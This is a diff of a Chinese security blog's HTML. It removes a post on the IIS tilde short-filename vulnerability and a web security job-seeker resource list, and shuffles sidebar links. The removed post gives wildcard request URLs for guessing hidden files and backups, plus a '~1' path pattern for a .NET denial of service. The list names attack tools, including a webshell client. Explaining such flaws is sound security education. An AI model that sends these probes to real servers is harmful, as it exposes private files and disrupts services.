-<p>返回404。若abcdef开头的是一个文件，则    </p>
-
-<pre class="line-numbers"><code class="language-http">http://www.xxx.com/abcdef*~1/.aspx
-</code></pre>
-
-<p>返回404（注意！返回404表示存在）同理我们可以猜出文件后缀名：    </p>
-
-<pre class="line-numbers"><code class="language-http">http://www.xxx.com/abcdef*~1*h*/.aspx
-</code></pre>
-
-<p>若返回404则代表扩展名中肯定存在h字符。<br/><br/>
-利用此漏洞可以猜解后台地址、敏感文件/文件名（如备份的rar、bak、sql等）；某些情况下，可以通过短文件名漏洞直接下载对应的文件（如备份sql文件）。<br/><br/>
-<br><br/>
-<strong>.Net Framework 拒绝服务攻击</strong><br/><br/>
-当请求文件夹名称包含 ~1 的请求，会导致不存在该文件的 .Net Framework 去递归查询所有根目录。如果只有一个“~1”是无效的，当“~1”大于一个，比如像这样：        </p>
-
-<pre class="line-numbers"><code class="language-http">\wwwtest\fuck~1\~1\~1\~1.aspx
-</code></pre>
-
-<p>此时文件系统会这样调用：    </p>
-
-<pre class="line-numbers"><code class="language-txt">\wwwtest                           SUCCESS
-\wwwtest\fuck~1\~1\~1\~1           PATH NOT FOUND
-\wwwtest\fuck~1                    NAME NOT FOUND
-\wwwtest\fuck~1\~1\                PATH NOT FOUND
-\wwwtest\fuck~1\~1\~1\             PATH NOT FOUND
-\wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
-\wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
-\wwwtest\fuck~1\~1\~1              PATH NOT FOUND
-\wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
-\wwwtest\fuck~1\~1\~1              PATH NOT FOUND
-\wwwtest\fuck~1\~1                 PATH NOT FOUND
-\wwwtest\fuck~1                    NAME NOT FOUND
-\wwwtest                           SUCCESS
-\wwwtest                           SUCCESS
-</code></pre>
-
-<p>如果我们请求的文件/文件夹名同时存在大小写时，这个请求会被请求两次，一次是原封不动的请求，一次是全部使用小写的请求。<br/><br/>
-下表显示了每个请求的FS调用的数量（Windows 2008 R2, IIS 7.5(latest patch – June 2012), and .Net framework 4.0.30319 (在别的系统下可能会不同)）<br/><br/>
-<figure><img src="media/15446866501207/F5%E8%B0%83%E7%94%A8.png" alt="F5调用"/><figcaption>F5调用</figcaption></figure></p>
-
-<p>这个问题适用于当时的 .Net framework 的所有版本(<br/><br/>
-    IIS 1.0, Windows NT 3.51<br/><br/>
-    IIS 2.0, Windows NT 4.0<br/><br/>
-    IIS 3.0, Windows NT 4.0 Service Pack 2<br/><br/>
-    IIS 4.0, Windows NT 4.0 Option Pack<br/><br/>
-    IIS 5.0, Windows 2000<br/><br/>
-    IIS 5.1, Windows XP Professional and Windows XP Media Center Edition<br/><br/>
-    IIS 6.0, Windows Server 2003 and Windows XP Professional x64 Edition<br/><br/>
-    IIS 7.0, Windows Server 2008 and Windows Vista<br/><br/>
-    IIS 7.5, Windows 7 (error remotely enabled or no web.config)<br/><br/>
-    IIS 7.5, Windows 2008 (classic pipeline mode))<br/><br/>
-只是 F5 的调用次数会有不同。    </p>
-
-<h2 id="toc_8">参考链接</h2>
-
-<hr/>
-
-<ul>
-<li><a href="http://www.lijiejie.com/iis-win8-3-shortname-brute/">http://www.lijiejie.com/iis-win8-3-shortname-brute/</a><br/></li>
-<li><a href="https://www.acunetix.com/blog/articles/windows-short-8-3-filenames-web-security-problem/">https://www.acunetix.com/blog/articles/windows-short-8-3-filenames-web-security-problem/</a><br/></li>
-<li><a href="http://www.freebuf.com/articles/4908.html">http://www.freebuf.com/articles/4908.html</a><br/></li>
-<li><a href="https://support.microsoft.com/zh-cn/help/121007/how-to-disable-8-3-file-name-creation-on-ntfs-partitions">https://support.microsoft.com/zh-cn/help/121007/how-to-disable-8-3-file-name-creation-on-ntfs-partitions</a><br/></li>
-<li><a href="https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf">https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf</a><br/></li>
-</ul>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2018/12/13 15:37 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15446864537652.html">
-                
-                  <h1>Web安全工程师求职清单</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<blockquote>
-<p>一年前写的一点玩意，没什么卵用</p>
-</blockquote>
-
-<h2 id="toc_0">安全资讯</h2>
-
-<p><a href="http://www.freebuf.com/">freebuf</a></p>
-
-<p><a href="https://www.t00ls.net/">tools</a></p>
-
-<p><a href="https://www.secpulse.com/">安全脉搏</a></p>
-
-<p><a href="https://packetstormsecurity.com/">数据包风暴</a></p>
-
-<p><a href="http://www.4hou.com/">嘶吼</a></p>
-
-<p><a href="https://www.aqniu.com/">安全牛</a></p>
-
-<p><a href="https://www.anquanke.com/">安全客</a></p>
-
-<p><a href="https://www.sec-wiki.com/">sec-wiki</a></p>
-
-<p><a href="http://www.secdoctor.com/">中国信息安全博士网</a></p>
-
-<h2 id="toc_1">威胁情报</h2>
-
-<p>暂略</p>
-
-<h2 id="toc_2">安全工具</h2>
-
-<p><a href="https://www.ctftools.com/down/">最强安全工具集</a></p>
-
-<ul>
-<li>burpsuite(抓包)</li>
-<li>sqlmap(sql注入)</li>
-<li>whireshark(网络抓包)</li>
-<li>中国菜刀(webshell、一句话后门)</li>
-<li>HxD(十六进制编辑器和磁盘编辑器)</li>
-<li>nmap(扫描)</li>
-<li>hydra(爆破)</li>
-<li>cain(爆破)</li>
-<li>metasploit(漏洞利用)</li>
-<li>mitmproxy(http/https代理)</li>
-<li>commix(命令注入)</li>
-<li>httrack(网站克隆)</li>
-<li>netcat(瑞士军刀-网络调试和探测工具)</li>
-<li>scapy(python的交互式数据包操作程序和库)</li>
-<li>empire(域渗透)</li>
-</ul>
-
-<h2 id="toc_3">靶机环境</h2>
-
-<h2 id="toc_4">安全知识库</h2>
-
-<p><a href="https://www.anquanquan.info/">安全圈</a></p>
-
-<p><a href="http://wiki.open.qq.com/wiki/%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8%E8%A7%84%E8%8C%83">腾讯安全开发规范</a></p>
-
-<p><a href="https://highon.coffee/blog/cheat-sheet/">安全研究备忘单</a></p>
-
-<p><a href="https://portswigger.net/kb/issues">Burp漏洞定义</a></p>
-
-<p><a href="https://www.offensive-security.com/metasploit-unleashed/">MSF框架终极指南</a></p>
-
-<p><a href="https://www.owasp.org/index.php/Main_Page">OWASP</a></p>
-
-<p><a href="http://vipread.com/index">vipread知识库</a></p>
-
-<p><a href="https://kb.help.rapid7.com/docs/">Rapid7知识库</a></p>
-
-<p><a href="https://kernelnewbies.org/">linux内核研究</a></p>
-
-<p><a href="http://www.loner.fm/bugs/">乌云漏洞</a></p>
-
-<p><a href="https://wooyun.js.org/">乌云文章</a></p>
-
-<p><a href="http://www.office-cn.net/t/api/index.html?web.htm">WindowsAPI参考手册</a></p>
-
-<p><a href="https://support.portswigger.net/customer/portal/articles/2326039-the-burp-methodology">Burp方法论</a></p>
-
-<p><a href="https://ctf-wiki.github.io/ctf-wiki/">CTF-Wiki</a></p>
-
-<p><a href="https://github.com/ctfs/">CTFs</a></p>
-
-<p><a href="https://ctftime.org">ctftime</a></p>
-
-<p><a href="https://www.codesec.net/">代码安全</a></p>
-
-<p><a href="https://silic.wiki/doku.php">习科小黑板</a></p>
-
-<p><a href="https://bbs.safewiki.org/portal.php">安全文库</a></p>
-
-<p><a href="http://webscan.360.cn/vul">360网站常见漏洞</a></p>
-
-<h2 id="toc_5">漏洞平台</h2>
-
-<p><a href="https://butian.360.cn/">补天</a></p>
-
-<p><a href="https://www.vulbox.com/">漏洞盒子</a></p>
-
-<p><a href="https://www.bugbank.cn/">漏洞银行</a></p>
-
-<p><a href="http://www.cnvd.org.cn/">CNVD国家信息安全漏洞共享平台</a></p>
-
-<p><a href="https://src.edu-info.edu.cn/">教育行业漏洞报告平台</a></p>
-
-<p><a href="https://www.seebug.org">Seebug</a></p>
-
-<p><a href="http://0xsafe.org/vuldb.html">Vuldbs漏洞平台</a></p>
-
-<h2 id="toc_6">技能要求</h2>
-
-<ul>
-<li>不同场景下的渗透测试流程、方法</li>
-<li>常见漏洞的攻击方法和防御方法</li>
-<li>代码级白盒测试能力</li>
-<li>owasp_top10概念、原理、测试方法、防御方法</li>
-<li>主流防火墙、IDS、IPS、漏洞扫描工具的安装、使用方法</li>
-<li>熟悉python、php、javascript、c、c++等语言的一种或多种</li>
-<li>cissp之类的证书或ctf解题能力是加分项</li>
-<li>各种靶机环境搭建</li>
-<li>安全分析报告的编写</li>
-<li>对业务快速熟悉的能力（业务安全重点、应用范围划分、业务安全基线）</li>
-<li>spring、struts、hibernate框架安全相关</li>
-<li>web组件加固、服务器加固、数据库加固</li>
-<li>域渗透、dns、arp等内网渗透知识</li>
-<li>各类提权如系统提权、数据库提权等</li>
-<li>风险评估、等级保护、安全体系规划、安全体系建设。包括信息资产管理、安全威胁和风险评估、安全解决方案制定、信息安全体系实施</li>
-<li>Nginx、Apache、Tomcat等安全配置基线</li>
-<li>各类安全测试标准(ISSAF、OSSTMM、OWASP、微软SDLC、OPENSAMM、BSIMM、SSECMM)</li>
-<li>网络日志分析、攻击流量检测</li>
-<li>hadoop、openstack、sdn云安全</li>
-<li>mongodb、redis、HBASE等nosql安全</li>
-<li>burpsuite插件编写</li>
-<li>python脚本开发能力、shell脚本开发能力</li>
-</ul>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2018/12/13 15:34 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
               
 
 
@@ -1138,6 +1290,18 @@ wordpress 有一个备份博客的插件，该插件会为备份创建一个自�
 	      
 		      
 			      <li class="post">
+			        <a href="15643953233297.html">oh-my-zsh配置</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
+			        <a href="15643901825363.html">arch 使用 nginx -t 时报错“could not build optimal types_hash, you should increase either types_hash_max_size: 1024 or types_hash_bucket_size: 64; ignoring types_hash_bucket_size” 解决办法</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
 			        <a href="15643634653227.html">manjaro 安装 vmtools</a>
 			      </li>
 		     
@@ -1151,18 +1315,6 @@ wordpress 有一个备份博客的插件，该插件会为备份创建一个自�
 		      
 			      <li class="post">
 			        <a href="15641083818915.html">manjaro更改国内源操作</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15640473747565.html">kali 下更新软件时报错，说下列签名无效的解决办法</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15638711886127.html">Archiso</a>
 			      </li>
 		     
 		  
